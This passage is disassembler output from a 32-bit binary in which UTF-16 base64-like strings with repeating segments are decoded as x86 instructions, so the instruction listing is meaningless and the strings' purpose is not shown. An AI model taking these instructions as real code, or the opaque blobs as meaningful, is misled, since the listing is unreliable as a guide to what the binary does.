1000361c:	00 32                	add    %dh,(%edx)
1000361e:	00 5a 00             	add    %bl,0x0(%edx)
10003621:	35 00 52 00 6d       	xor    $0x6d005200,%eax
10003626:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
1000362a:	00 61 00             	add    %ah,0x0(%ecx)
1000362d:	6d                   	insl   (%dx),%es:(%edi)
1000362e:	00 70 00             	add    %dh,0x0(%eax)
10003631:	4f                   	dec    %edi
10003632:	00 63 00             	add    %ah,0x0(%ebx)
10003635:	7a 00                	jp     0x10003637
10003637:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000363b:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
1000363f:	5a                   	pop    %edx
10003640:	00 4b 00             	add    %cl,0x0(%ebx)
10003643:	62 00                	bound  %eax,(%eax)
10003645:	6c                   	insb   (%dx),%es:(%edi)
10003646:	00 70 00             	add    %dh,0x0(%eax)
10003649:	6e                   	outsb  %ds:(%esi),(%dx)
1000364a:	00 53 00             	add    %dl,0x0(%ebx)
1000364d:	6d                   	insl   (%dx),%es:(%edi)
1000364e:	00 70 00             	add    %dh,0x0(%eax)
10003651:	71 00                	jno    0x10003653
10003653:	54                   	push   %esp
10003654:	00 6e 00             	add    %ch,0x0(%esi)
10003657:	4d                   	dec    %ebp
10003658:	00 33                	add    %dh,(%ebx)
1000365a:	00 5a 00             	add    %bl,0x0(%edx)
1000365d:	6e                   	outsb  %ds:(%esi),(%dx)
1000365e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003662:	00 5a 00             	add    %bl,0x0(%edx)
10003665:	30 00                	xor    %al,(%eax)
10003667:	70 00                	jo     0x10003669
10003669:	71 00                	jno    0x1000366b
1000366b:	61                   	popa
1000366c:	00 6b 00             	add    %ch,0x0(%ebx)
1000366f:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
10003674:	00 32                	add    %dh,(%edx)
10003676:	00 5a 00             	add    %bl,0x0(%edx)
10003679:	35 00 52 00 6c       	xor    $0x6c005200,%eax
1000367e:	00 68 00             	add    %ch,0x0(%eax)
10003681:	52                   	push   %edx
10003682:	00 5a 00             	add    %bl,0x0(%edx)
10003685:	32 00                	xor    (%eax),%al
10003687:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
1000368b:	61                   	popa
1000368c:	00 6d 00             	add    %ch,0x0(%ebp)
1000368f:	70 00                	jo     0x10003691
10003691:	4f                   	dec    %edi
10003692:	00 63 00             	add    %ah,0x0(%ebx)
10003695:	7a 00                	jp     0x10003697
10003697:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000369b:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
1000369f:	5a                   	pop    %edx
100036a0:	00 6e 00             	add    %ch,0x0(%esi)
100036a3:	53                   	push   %ebx
100036a4:	00 6d 00             	add    %ch,0x0(%ebp)
100036a7:	70 00                	jo     0x100036a9
100036a9:	71 00                	jno    0x100036ab
100036ab:	54                   	push   %esp
100036ac:	00 6e 00             	add    %ch,0x0(%esi)
100036af:	4d                   	dec    %ebp
100036b0:	00 33                	add    %dh,(%ebx)
100036b2:	00 5a 00             	add    %bl,0x0(%edx)
100036b5:	6e                   	outsb  %ds:(%esi),(%dx)
100036b6:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
100036ba:	00 59 00             	add    %bl,0x0(%ecx)
100036bd:	30 00                	xor    %al,(%eax)
100036bf:	68 00 4b 00 5a       	push   $0x5a004b00
100036c4:	00 30                	add    %dh,(%eax)
100036c6:	00 70 00             	add    %dh,0x0(%eax)
100036c9:	71 00                	jno    0x100036cb
100036cb:	61                   	popa
100036cc:	00 6b 00             	add    %ch,0x0(%ebx)
100036cf:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
100036d4:	00 32                	add    %dh,(%edx)
100036d6:	00 5a 00             	add    %bl,0x0(%edx)
100036d9:	35 00 52 00 6d       	xor    $0x6d005200,%eax
100036de:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
100036e2:	00 61 00             	add    %ah,0x0(%ecx)
100036e5:	6d                   	insl   (%dx),%es:(%edi)
100036e6:	00 70 00             	add    %dh,0x0(%eax)
100036e9:	4f                   	dec    %edi
100036ea:	00 63 00             	add    %ah,0x0(%ebx)
100036ed:	7a 00                	jp     0x100036ef
100036ef:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100036f3:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
100036f7:	5a                   	pop    %edx
100036f8:	00 32                	add    %dh,(%edx)
100036fa:	00 57 00             	add    %dl,0x0(%edi)
100036fd:	54                   	push   %esp
100036fe:	00 4a 00             	add    %cl,0x0(%edx)
10003701:	6e                   	outsb  %ds:(%esi),(%dx)
10003702:	00 53 00             	add    %dl,0x0(%ebx)
10003705:	6d                   	insl   (%dx),%es:(%edi)
10003706:	00 70 00             	add    %dh,0x0(%eax)
10003709:	71 00                	jno    0x1000370b
1000370b:	54                   	push   %esp
1000370c:	00 6e 00             	add    %ch,0x0(%esi)
1000370f:	4d                   	dec    %ebp
10003710:	00 33                	add    %dh,(%ebx)
10003712:	00 5a 00             	add    %bl,0x0(%edx)
10003715:	6e                   	outsb  %ds:(%esi),(%dx)
10003716:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
1000371a:	00 5a 00             	add    %bl,0x0(%edx)
1000371d:	30 00                	xor    %al,(%eax)
1000371f:	70 00                	jo     0x10003721
10003721:	71 00                	jno    0x10003723
10003723:	61                   	popa
10003724:	00 6b 00             	add    %ch,0x0(%ebx)
10003727:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
1000372c:	00 32                	add    %dh,(%edx)
1000372e:	00 5a 00             	add    %bl,0x0(%edx)
10003731:	35 00 52 00 6c       	xor    $0x6c005200,%eax
10003736:	00 5a 00             	add    %bl,0x0(%edx)
10003739:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
1000373d:	32 00                	xor    (%eax),%al
1000373f:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
10003743:	61                   	popa
10003744:	00 6d 00             	add    %ch,0x0(%ebp)
10003747:	70 00                	jo     0x10003749
10003749:	4f                   	dec    %edi
1000374a:	00 63 00             	add    %ah,0x0(%ebx)
1000374d:	7a 00                	jp     0x1000374f
1000374f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003753:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
10003757:	5a                   	pop    %edx
10003758:	00 6e 00             	add    %ch,0x0(%esi)
1000375b:	53                   	push   %ebx
1000375c:	00 6d 00             	add    %ch,0x0(%ebp)
1000375f:	70 00                	jo     0x10003761
10003761:	71 00                	jno    0x10003763
10003763:	54                   	push   %esp
10003764:	00 6e 00             	add    %ch,0x0(%esi)
10003767:	4d                   	dec    %ebp
10003768:	00 33                	add    %dh,(%ebx)
1000376a:	00 5a 00             	add    %bl,0x0(%edx)
1000376d:	6e                   	outsb  %ds:(%esi),(%dx)
1000376e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003772:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
10003776:	00 30                	add    %dh,(%eax)
10003778:	00 39                	add    %bh,(%ecx)
1000377a:	00 5a 00             	add    %bl,0x0(%edx)
1000377d:	30 00                	xor    %al,(%eax)
1000377f:	70 00                	jo     0x10003781
10003781:	71 00                	jno    0x10003783
10003783:	61                   	popa
10003784:	00 6b 00             	add    %ch,0x0(%ebx)
10003787:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
1000378c:	00 32                	add    %dh,(%edx)
1000378e:	00 5a 00             	add    %bl,0x0(%edx)
10003791:	35 00 52 00 67       	xor    $0x67005200,%eax
10003796:	00 3d 00 3d 00 00    	add    %bh,0x3d00
1000379c:	15 67 00 4a 00       	adc    $0x4a0067,%eax
100037a1:	6a 00                	push   $0x0
100037a3:	6a 00                	push   $0x0
100037a5:	4e                   	dec    %esi
100037a6:	00 73 00             	add    %dh,0x0(%ebx)
100037a9:	37                   	aaa
100037aa:	00 66 00             	add    %ah,0x0(%esi)
100037ad:	79 00                	jns    0x100037af
100037af:	46                   	inc    %esi
100037b0:	00 00                	add    %al,(%eax)
100037b2:	01 00                	add    %eax,(%eax)
100037b4:	86 39                	xchg   %bh,(%ecx)
100037b6:	59                   	pop    %ecx
100037b7:	00 31                	add    %dh,(%ecx)
100037b9:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
100037bd:	00 59 00             	add    %bl,0x0(%ecx)
100037c0:	57                   	push   %edi
100037c1:	00 5a 00             	add    %bl,0x0(%edx)
100037c4:	42                   	inc    %edx
100037c5:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
100037c9:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
100037cd:	00 4d 00             	add    %cl,0x0(%ebp)
100037d0:	31 00                	xor    %eax,(%eax)
100037d2:	4a                   	dec    %edx
100037d3:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
100037d7:	00 6d 00             	add    %ch,0x0(%ebp)
100037da:	4e                   	dec    %esi
100037db:	00 58 00             	add    %bl,0x0(%eax)
100037de:	54                   	push   %esp
100037df:	00 32                	add    %dh,(%edx)
100037e1:	00 46 00             	add    %al,0x0(%esi)
100037e4:	6d                   	insl   (%dx),%es:(%edi)
100037e5:	00 51 00             	add    %dl,0x0(%ecx)
100037e8:	58                   	pop    %eax
100037e9:	00 52 00             	add    %dl,0x0(%edx)
100037ec:	6e                   	outsb  %ds:(%esi),(%dx)
100037ed:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
100037f1:	00 4e 00             	add    %cl,0x0(%esi)
100037f4:	6a 00                	push   $0x0
100037f6:	56                   	push   %esi
100037f7:	00 30                	add    %dh,(%eax)
100037f9:	00 39                	add    %bh,(%ecx)
100037fb:	00 68 00             	add    %ch,0x0(%eax)
100037fe:	5a                   	pop    %edx
100037ff:	00 6b 00             	add    %ch,0x0(%ebx)
10003802:	46                   	inc    %esi
10003803:	00 30                	add    %dh,(%eax)
10003805:	00 5a 00             	add    %bl,0x0(%edx)
10003808:	30 00                	xor    %al,(%eax)
1000380a:	30 00                	xor    %al,(%eax)
1000380c:	7a 00                	jp     0x1000380e
1000380e:	63 00                	arpl   %eax,(%eax)
10003810:	47                   	inc    %edi
10003811:	00 4a 00             	add    %cl,0x0(%edx)
10003814:	48                   	dec    %eax
10003815:	00 59 00             	add    %bl,0x0(%ecx)
10003818:	31 00                	xor    %eax,(%eax)
1000381a:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
1000381e:	59                   	pop    %ecx
1000381f:	00 57 00             	add    %dl,0x0(%edi)
10003822:	5a                   	pop    %edx
10003823:	00 42 00             	add    %al,0x0(%edx)
10003826:	64 00 47 00          	add    %al,%fs:0x0(%edi)
1000382a:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
1000382e:	4d                   	dec    %ebp
1000382f:	00 32                	add    %dh,(%edx)
10003831:	00 4e 00             	add    %cl,0x0(%esi)
10003834:	58                   	pop    %eax
10003835:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003839:	00 46 00             	add    %al,0x0(%esi)
1000383c:	6d                   	insl   (%dx),%es:(%edi)
1000383d:	00 51 00             	add    %dl,0x0(%ecx)
10003840:	58                   	pop    %eax
10003841:	00 52 00             	add    %dl,0x0(%edx)
10003844:	6e                   	outsb  %ds:(%esi),(%dx)
10003845:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003849:	00 4e 00             	add    %cl,0x0(%esi)
1000384c:	57                   	push   %edi
1000384d:	00 61 00             	add    %ah,0x0(%ecx)
10003850:	30 00                	xor    %al,(%eax)
10003852:	6c                   	insb   (%dx),%es:(%edi)
10003853:	00 6a 00             	add    %ch,0x0(%edx)
10003856:	56                   	push   %esi
10003857:	00 30                	add    %dh,(%eax)
10003859:	00 39                	add    %bh,(%ecx)
1000385b:	00 68 00             	add    %ch,0x0(%eax)
1000385e:	5a                   	pop    %edx
1000385f:	00 6b 00             	add    %ch,0x0(%ebx)
10003862:	46                   	inc    %esi
10003863:	00 30                	add    %dh,(%eax)
10003865:	00 5a 00             	add    %bl,0x0(%edx)
10003868:	30 00                	xor    %al,(%eax)
1000386a:	30 00                	xor    %al,(%eax)
1000386c:	7a 00                	jp     0x1000386e
1000386e:	59                   	pop    %ecx
1000386f:	00 31                	add    %dh,(%ecx)
10003871:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003875:	00 59 00             	add    %bl,0x0(%ecx)
10003878:	57                   	push   %edi
10003879:	00 5a 00             	add    %bl,0x0(%edx)
1000387c:	42                   	inc    %edx
1000387d:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003881:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003885:	00 4d 00             	add    %cl,0x0(%ebp)
10003888:	30 00                	xor    %al,(%eax)
1000388a:	68 00 53 00 64       	push   $0x64005300
1000388f:	00 6d 00             	add    %ch,0x0(%ebp)
10003892:	4e                   	dec    %esi
10003893:	00 58 00             	add    %bl,0x0(%eax)
10003896:	54                   	push   %esp
10003897:	00 32                	add    %dh,(%edx)
10003899:	00 46 00             	add    %al,0x0(%esi)
1000389c:	6d                   	insl   (%dx),%es:(%edi)
1000389d:	00 51 00             	add    %dl,0x0(%ecx)
100038a0:	58                   	pop    %eax
100038a1:	00 52 00             	add    %dl,0x0(%edx)
100038a4:	6e                   	outsb  %ds:(%esi),(%dx)
100038a5:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
100038a9:	00 4e 00             	add    %cl,0x0(%esi)
100038ac:	6a 00                	push   $0x0
100038ae:	56                   	push   %esi
100038af:	00 30                	add    %dh,(%eax)
100038b1:	00 39                	add    %bh,(%ecx)
100038b3:	00 68 00             	add    %ch,0x0(%eax)
100038b6:	5a                   	pop    %edx
100038b7:	00 6b 00             	add    %ch,0x0(%ebx)
100038ba:	46                   	inc    %esi
100038bb:	00 30                	add    %dh,(%eax)
100038bd:	00 5a 00             	add    %bl,0x0(%edx)
100038c0:	30 00                	xor    %al,(%eax)
100038c2:	30 00                	xor    %al,(%eax)
100038c4:	7a 00                	jp     0x100038c6
100038c6:	53                   	push   %ebx
100038c7:	00 55 00             	add    %dl,0x0(%ebp)
100038ca:	68 00 6b 00 59       	push   $0x59006b00
100038cf:	00 31                	add    %dh,(%ecx)
100038d1:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
100038d5:	00 59 00             	add    %bl,0x0(%ecx)
100038d8:	57                   	push   %edi
100038d9:	00 5a 00             	add    %bl,0x0(%edx)
100038dc:	42                   	inc    %edx
100038dd:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
100038e1:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
100038e5:	00 4d 00             	add    %cl,0x0(%ebp)
100038e8:	32 00                	xor    (%eax),%al
100038ea:	4e                   	dec    %esi
100038eb:	00 58 00             	add    %bl,0x0(%eax)
100038ee:	54                   	push   %esp
100038ef:	00 32                	add    %dh,(%edx)
100038f1:	00 46 00             	add    %al,0x0(%esi)
100038f4:	6d                   	insl   (%dx),%es:(%edi)
100038f5:	00 51 00             	add    %dl,0x0(%ecx)
100038f8:	58                   	pop    %eax
100038f9:	00 52 00             	add    %dl,0x0(%edx)
100038fc:	6e                   	outsb  %ds:(%esi),(%dx)
100038fd:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003901:	00 4e 00             	add    %cl,0x0(%esi)
10003904:	35 00 59 00 56       	xor    $0x56005900,%eax
10003909:	00 68 00             	add    %ch,0x0(%eax)
1000390c:	6a 00                	push   $0x0
1000390e:	56                   	push   %esi
1000390f:	00 30                	add    %dh,(%eax)
10003911:	00 39                	add    %bh,(%ecx)
10003913:	00 68 00             	add    %ch,0x0(%eax)
10003916:	5a                   	pop    %edx
10003917:	00 6b 00             	add    %ch,0x0(%ebx)
1000391a:	46                   	inc    %esi
1000391b:	00 30                	add    %dh,(%eax)
1000391d:	00 5a 00             	add    %bl,0x0(%edx)
10003920:	30 00                	xor    %al,(%eax)
10003922:	30 00                	xor    %al,(%eax)
10003924:	7a 00                	jp     0x10003926
10003926:	59                   	pop    %ecx
10003927:	00 31                	add    %dh,(%ecx)
10003929:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
1000392d:	00 59 00             	add    %bl,0x0(%ecx)
10003930:	57                   	push   %edi
10003931:	00 5a 00             	add    %bl,0x0(%edx)
10003934:	42                   	inc    %edx
10003935:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003939:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
1000393d:	00 4d 00             	add    %cl,0x0(%ebp)
10003940:	31 00                	xor    %eax,(%eax)
10003942:	4a                   	dec    %edx
10003943:	00 73 00             	add    %dh,0x0(%ebx)
10003946:	53                   	push   %ebx
10003947:	00 57 00             	add    %dl,0x0(%edi)
1000394a:	4e                   	dec    %esi
1000394b:	00 58 00             	add    %bl,0x0(%eax)
1000394e:	54                   	push   %esp
1000394f:	00 32                	add    %dh,(%edx)
10003951:	00 46 00             	add    %al,0x0(%esi)
10003954:	6d                   	insl   (%dx),%es:(%edi)
10003955:	00 51 00             	add    %dl,0x0(%ecx)
10003958:	58                   	pop    %eax
10003959:	00 52 00             	add    %dl,0x0(%edx)
1000395c:	6e                   	outsb  %ds:(%esi),(%dx)
1000395d:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003961:	00 4e 00             	add    %cl,0x0(%esi)
10003964:	6a 00                	push   $0x0
10003966:	56                   	push   %esi
10003967:	00 30                	add    %dh,(%eax)
10003969:	00 39                	add    %bh,(%ecx)
1000396b:	00 68 00             	add    %ch,0x0(%eax)
1000396e:	5a                   	pop    %edx
1000396f:	00 6b 00             	add    %ch,0x0(%ebx)
10003972:	46                   	inc    %esi
10003973:	00 30                	add    %dh,(%eax)
10003975:	00 5a 00             	add    %bl,0x0(%edx)
10003978:	30 00                	xor    %al,(%eax)
1000397a:	30 00                	xor    %al,(%eax)
1000397c:	7a 00                	jp     0x1000397e
1000397e:	52                   	push   %edx
1000397f:	00 57 00             	add    %dl,0x0(%edi)
10003982:	51                   	push   %ecx
10003983:	00 78 00             	add    %bh,0x0(%eax)
10003986:	59                   	pop    %ecx
10003987:	00 31                	add    %dh,(%ecx)
10003989:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
1000398d:	00 59 00             	add    %bl,0x0(%ecx)
10003990:	57                   	push   %edi
10003991:	00 5a 00             	add    %bl,0x0(%edx)
10003994:	42                   	inc    %edx
10003995:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003999:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
1000399d:	00 4d 00             	add    %cl,0x0(%ebp)
100039a0:	32 00                	xor    (%eax),%al
100039a2:	4e                   	dec    %esi
100039a3:	00 58 00             	add    %bl,0x0(%eax)
100039a6:	54                   	push   %esp
100039a7:	00 32                	add    %dh,(%edx)
100039a9:	00 46 00             	add    %al,0x0(%esi)
100039ac:	6d                   	insl   (%dx),%es:(%edi)
100039ad:	00 51 00             	add    %dl,0x0(%ecx)
100039b0:	58                   	pop    %eax
100039b1:	00 52 00             	add    %dl,0x0(%edx)
100039b4:	6e                   	outsb  %ds:(%esi),(%dx)
100039b5:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
100039b9:	00 4e 00             	add    %cl,0x0(%esi)
100039bc:	52                   	push   %edx
100039bd:	00 56 00             	add    %dl,0x0(%esi)
100039c0:	6c                   	insb   (%dx),%es:(%edi)
100039c1:	00 70 00             	add    %dh,0x0(%eax)
100039c4:	6a 00                	push   $0x0
100039c6:	56                   	push   %esi
100039c7:	00 30                	add    %dh,(%eax)
100039c9:	00 39                	add    %bh,(%ecx)
100039cb:	00 68 00             	add    %ch,0x0(%eax)
100039ce:	5a                   	pop    %edx
100039cf:	00 6b 00             	add    %ch,0x0(%ebx)
100039d2:	46                   	inc    %esi
100039d3:	00 30                	add    %dh,(%eax)
100039d5:	00 5a 00             	add    %bl,0x0(%edx)
100039d8:	30 00                	xor    %al,(%eax)
100039da:	30 00                	xor    %al,(%eax)
100039dc:	7a 00                	jp     0x100039de
100039de:	59                   	pop    %ecx
100039df:	00 31                	add    %dh,(%ecx)
100039e1:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
100039e5:	00 59 00             	add    %bl,0x0(%ecx)
100039e8:	57                   	push   %edi
100039e9:	00 5a 00             	add    %bl,0x0(%edx)
100039ec:	42                   	inc    %edx
100039ed:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
100039f1:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
100039f5:	00 4d 00             	add    %cl,0x0(%ebp)
100039f8:	32 00                	xor    (%eax),%al
100039fa:	74 00                	je     0x100039fc
100039fc:	6b 00 52             	imul   $0x52,(%eax),%eax
100039ff:	00 57 00             	add    %dl,0x0(%edi)
10003a02:	4e                   	dec    %esi
10003a03:	00 58 00             	add    %bl,0x0(%eax)
10003a06:	54                   	push   %esp
10003a07:	00 32                	add    %dh,(%edx)
10003a09:	00 46 00             	add    %al,0x0(%esi)
10003a0c:	6d                   	insl   (%dx),%es:(%edi)
10003a0d:	00 51 00             	add    %dl,0x0(%ecx)
10003a10:	58                   	pop    %eax
10003a11:	00 52 00             	add    %dl,0x0(%edx)
10003a14:	6e                   	outsb  %ds:(%esi),(%dx)
10003a15:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003a19:	00 4e 00             	add    %cl,0x0(%esi)
10003a1c:	6a 00                	push   $0x0
10003a1e:	56                   	push   %esi
10003a1f:	00 30                	add    %dh,(%eax)
10003a21:	00 39                	add    %bh,(%ecx)
10003a23:	00 68 00             	add    %ch,0x0(%eax)
10003a26:	5a                   	pop    %edx
10003a27:	00 6b 00             	add    %ch,0x0(%ebx)
10003a2a:	46                   	inc    %esi
10003a2b:	00 30                	add    %dh,(%eax)
10003a2d:	00 5a 00             	add    %bl,0x0(%edx)
10003a30:	30 00                	xor    %al,(%eax)
10003a32:	30 00                	xor    %al,(%eax)
10003a34:	7a 00                	jp     0x10003a36
10003a36:	5a                   	pop    %edx
10003a37:	00 47 00             	add    %al,0x0(%edi)
10003a3a:	46                   	inc    %esi
10003a3b:	00 4f 00             	add    %cl,0x0(%edi)
10003a3e:	59                   	pop    %ecx
10003a3f:	00 31                	add    %dh,(%ecx)
10003a41:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003a45:	00 59 00             	add    %bl,0x0(%ecx)
10003a48:	57                   	push   %edi
10003a49:	00 5a 00             	add    %bl,0x0(%edx)
10003a4c:	42                   	inc    %edx
10003a4d:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003a51:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003a55:	00 4d 00             	add    %cl,0x0(%ebp)
10003a58:	32 00                	xor    (%eax),%al
10003a5a:	4e                   	dec    %esi
10003a5b:	00 58 00             	add    %bl,0x0(%eax)
10003a5e:	54                   	push   %esp
10003a5f:	00 32                	add    %dh,(%edx)
10003a61:	00 46 00             	add    %al,0x0(%esi)
10003a64:	6d                   	insl   (%dx),%es:(%edi)
10003a65:	00 51 00             	add    %dl,0x0(%ecx)
10003a68:	58                   	pop    %eax
10003a69:	00 52 00             	add    %dl,0x0(%edx)
10003a6c:	6e                   	outsb  %ds:(%esi),(%dx)
10003a6d:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003a71:	00 4e 00             	add    %cl,0x0(%esi)
10003a74:	59                   	pop    %ecx
10003a75:	00 52 00             	add    %dl,0x0(%edx)
10003a78:	6b 00 74             	imul   $0x74,(%eax),%eax
10003a7b:	00 6a 00             	add    %ch,0x0(%edx)
10003a7e:	56                   	push   %esi
10003a7f:	00 30                	add    %dh,(%eax)
10003a81:	00 39                	add    %bh,(%ecx)
10003a83:	00 68 00             	add    %ch,0x0(%eax)
10003a86:	5a                   	pop    %edx
10003a87:	00 6b 00             	add    %ch,0x0(%ebx)
10003a8a:	46                   	inc    %esi
10003a8b:	00 30                	add    %dh,(%eax)
10003a8d:	00 5a 00             	add    %bl,0x0(%edx)
10003a90:	30 00                	xor    %al,(%eax)
10003a92:	30 00                	xor    %al,(%eax)
10003a94:	7a 00                	jp     0x10003a96
10003a96:	59                   	pop    %ecx
10003a97:	00 31                	add    %dh,(%ecx)
10003a99:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003a9d:	00 59 00             	add    %bl,0x0(%ecx)
10003aa0:	57                   	push   %edi
10003aa1:	00 5a 00             	add    %bl,0x0(%edx)
10003aa4:	42                   	inc    %edx
10003aa5:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003aa9:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003aad:	00 4d 00             	add    %cl,0x0(%ebp)
10003ab0:	32 00                	xor    (%eax),%al
10003ab2:	52                   	push   %edx
10003ab3:	00 58 00             	add    %bl,0x0(%eax)
10003ab6:	5a                   	pop    %edx
10003ab7:	00 32                	add    %dh,(%edx)
10003ab9:	00 4e 00             	add    %cl,0x0(%esi)
10003abc:	58                   	pop    %eax
10003abd:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003ac1:	00 46 00             	add    %al,0x0(%esi)
10003ac4:	6d                   	insl   (%dx),%es:(%edi)
10003ac5:	00 51 00             	add    %dl,0x0(%ecx)
10003ac8:	58                   	pop    %eax
10003ac9:	00 52 00             	add    %dl,0x0(%edx)
10003acc:	6e                   	outsb  %ds:(%esi),(%dx)
10003acd:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003ad1:	00 4e 00             	add    %cl,0x0(%esi)
10003ad4:	6a 00                	push   $0x0
10003ad6:	56                   	push   %esi
10003ad7:	00 30                	add    %dh,(%eax)
10003ad9:	00 39                	add    %bh,(%ecx)
10003adb:	00 68 00             	add    %ch,0x0(%eax)
10003ade:	5a                   	pop    %edx
10003adf:	00 6b 00             	add    %ch,0x0(%ebx)
10003ae2:	46                   	inc    %esi
10003ae3:	00 30                	add    %dh,(%eax)
10003ae5:	00 5a 00             	add    %bl,0x0(%edx)
10003ae8:	30 00                	xor    %al,(%eax)
10003aea:	30 00                	xor    %al,(%eax)
10003aec:	7a 00                	jp     0x10003aee
10003aee:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003af2:	5a                   	pop    %edx
10003af3:	00 59 00             	add    %bl,0x0(%ecx)
10003af6:	59                   	pop    %ecx
10003af7:	00 31                	add    %dh,(%ecx)
10003af9:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003afd:	00 59 00             	add    %bl,0x0(%ecx)
10003b00:	57                   	push   %edi
10003b01:	00 5a 00             	add    %bl,0x0(%edx)
10003b04:	42                   	inc    %edx
10003b05:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003b09:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003b0d:	00 4d 00             	add    %cl,0x0(%ebp)
10003b10:	32 00                	xor    (%eax),%al
10003b12:	4e                   	dec    %esi
10003b13:	00 58 00             	add    %bl,0x0(%eax)
10003b16:	54                   	push   %esp
10003b17:	00 32                	add    %dh,(%edx)
10003b19:	00 46 00             	add    %al,0x0(%esi)
10003b1c:	6d                   	insl   (%dx),%es:(%edi)
10003b1d:	00 51 00             	add    %dl,0x0(%ecx)
10003b20:	58                   	pop    %eax
10003b21:	00 52 00             	add    %dl,0x0(%edx)
10003b24:	6e                   	outsb  %ds:(%esi),(%dx)
10003b25:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
10003b29:	00 4e 00             	add    %cl,0x0(%esi)
10003b2c:	77 00                	ja     0x10003b2e
10003b2e:	54                   	push   %esp
10003b2f:	00 46 00             	add    %al,0x0(%esi)
10003b32:	4e                   	dec    %esi
10003b33:	00 6a 00             	add    %ch,0x0(%edx)
10003b36:	56                   	push   %esi
10003b37:	00 30                	add    %dh,(%eax)
10003b39:	00 39                	add    %bh,(%ecx)
10003b3b:	00 68 00             	add    %ch,0x0(%eax)
10003b3e:	5a                   	pop    %edx
10003b3f:	00 6b 00             	add    %ch,0x0(%ebx)
10003b42:	46                   	inc    %esi
10003b43:	00 30                	add    %dh,(%eax)
10003b45:	00 5a 00             	add    %bl,0x0(%edx)
10003b48:	30 00                	xor    %al,(%eax)
10003b4a:	30 00                	xor    %al,(%eax)
10003b4c:	7a 00                	jp     0x10003b4e
10003b4e:	59                   	pop    %ecx
10003b4f:	00 31                	add    %dh,(%ecx)
10003b51:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
10003b55:	00 59 00             	add    %bl,0x0(%ecx)
10003b58:	57                   	push   %edi
10003b59:	00 5a 00             	add    %bl,0x0(%edx)
10003b5c:	42                   	inc    %edx
10003b5d:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003b61:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003b65:	00 4d 00             	add    %cl,0x0(%ebp)
10003b68:	7a 00                	jp     0x10003b6a
10003b6a:	49                   	dec    %ecx
10003b6b:	00 31                	add    %dh,(%ecx)
10003b6d:	00 63 00             	add    %ah,0x0(%ebx)
10003b70:	57                   	push   %edi
10003b71:	00 4e 00             	add    %cl,0x0(%esi)
10003b74:	58                   	pop    %eax
10003b75:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003b79:	00 46 00             	add    %al,0x0(%esi)
10003b7c:	6d                   	insl   (%dx),%es:(%edi)
10003b7d:	00 51 00             	add    %dl,0x0(%ecx)
10003b80:	58                   	pop    %eax
10003b81:	00 52 00             	add    %dl,0x0(%edx)
